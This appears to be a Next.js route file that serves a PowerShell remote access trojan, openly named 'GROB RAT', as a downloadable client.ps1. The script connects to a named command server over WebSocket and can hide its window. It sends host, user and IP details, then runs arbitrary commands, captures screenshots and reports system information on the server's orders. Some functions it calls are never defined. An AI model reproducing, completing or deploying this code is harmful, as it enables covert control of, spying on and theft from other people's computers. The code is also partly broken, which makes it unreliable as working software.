import { NextResponse } from "next/server"

export async function GET() {
  try {
    // PowerShell client that works without any dependencies
    const powershellScript = `# GROB RAT PowerShell Client v2.0
# No external dependencies required - works on any Windows PC

param(
    [string]$ServerUrl = "wss://glistening-mindfulness.up.railway.app",
    [string]$UserId = "",
    [bool]$AutoStartup = $false,
    [bool]$Hidden = $false
)

# Hide PowerShell window if hidden mode
if ($Hidden) {
    $Async = '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr handle, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -Name "Win32" -PassThru
    $Type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
}

# WebSocket client using .NET built-in classes
function Connect-WebSocket {
    param([string]$Url, [string]$UserId)
    
    try {
        $WS = New-Object System.Net.WebSockets.ClientWebSocket
        $CT = New-Object System.Threading.CancellationTokenSource
        $Buffer = New-Object byte[] 4096
        
        Write-Host "[+] Connecting to $Url..."
        $WS.ConnectAsync($Url, $CT.Token).Wait()
        Write-Host "[+] Connected successfully!"
        
        # Send initial connection with user ID
        $Auth = @{
            type = "auth"
            uid = $UserId
            pc_info = @{
                hostname = $env:COMPUTERNAME
                username = $env:USERNAME
                os = "Windows $([System.Environment]::OSVersion.Version.Major).$([System.Environment]::OSVersion.Version.Minor)"
                ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10)
            }
        } | ConvertTo-Json -Compress
        
        $AuthBuffer = [System.Text.Encoding]::UTF8.GetBytes($Auth)
        $WS.SendAsync($AuthBuffer, $System.Net.WebSockets.WebSocketMessageType.Text, $true, $CT.Token).Wait()
        
        # Listen for commands
        while ($WS.State -eq "Open") {
            try {
                $Result = $WS.ReceiveAsync($Buffer, $CT.Token)
                if ($Result.Result -eq "Close") { break }
                
                $Message = [System.Text.Encoding]::UTF8.GetString($Buffer, 0, $Result.Count)
                $Command = $Message | ConvertFrom-Json
                
                Write-Host "[+] Received command: $($Command.type)"
                
                switch ($Command.type) {
                    "screenshot" {
                        Take-Screenshot -Path "$env:TEMP\\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                    }
                    "cmd" {
                        Execute-Command -Command $Command.cmd
                    }
                    "info" {
                        Get-SystemInfo
                    }
                    "files" {
                        Get-Files -Path $Command.path
                    }
                }
            } catch {
                Write-Host "[-] Error processing command: $_"
            }
        }
    } catch {
        Write-Host "[-] WebSocket error: $_"
    } finally {
        if ($WS) { $WS.Dispose() }
        if ($CT) { $CT.Dispose() }
    }
}

function Take-Screenshot {
    param([string]$Path)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Bounds.Width, $Bounds.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Bounds.Location, [System.Drawing.Point]::Empty, $Bounds.Size)
        $Bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
        $Graphics.Dispose()
        $Bitmap.Dispose()
        
        Write-Host "[+] Screenshot saved: $Path"
        # Send screenshot back to server
        Send-File -Path $Path -Type "screenshot"
    } catch {
        Write-Host "[-] Screenshot error: $_"
    }
}

function Execute-Command {
    param([string]$Command)
    try {
        $Output = cmd.exe /c $Command 2>&1 | Out-String
        Write-Host "[+] Command executed: $Command"
        Send-Data -Type "cmd_result" -Data $Output
    } catch {
        Write-Host "[-] Command error: $_"
    }
}

function Get-SystemInfo {
    try {
        $Info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = "Windows $([System.Environment]::OSVersion.Version.Major).$([System.Environment]::OSVersion.Version.Minor)"
            architecture = $env:PROCESSOR_ARCHITECTURE
            domain = $env:USERDOMAIN
            ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10)
            drives = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | ConvertTo-Json -Compress
        }
        
        Send-Data -Type "system_info" -Data $Info
    } catch {
        Write-Host "[-] System info error: $_"
    }
}

function Send-Data {
    param([string]$Type, [object]$Data)
    try {
        $Message = @{
            type = $Type
            data = $Data
            uid = $UserId
        } | ConvertTo-Json -Compress
        
        $Buffer = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $WS.SendAsync($Buffer, $System.Net.WebSockets.WebSocketMessageType.Text, $true, $CT.Token).Wait()
    } catch {
        Write-Host "[-] Send error: $_"
    }
}

# Start the client
Write-Host "[+] GROB RAT PowerShell Client Starting..."
Write-Host "[+] Server: $ServerUrl"
Write-Host "[+] User ID: $UserId"

Connect-WebSocket -Url $ServerUrl -UserId $UserId
`

    return new NextResponse(powershellScript, {
      headers: {
        "Content-Type": "text/plain",
        "Content-Disposition": "attachment; filename=client.ps1",
      },
    })

  } catch (error: any) {
    console.error("PowerShell client error:", error)
    return NextResponse.json(
      { error: "Failed to generate PowerShell client", details: error.message },
      { status: 500 }
    )
  }
}
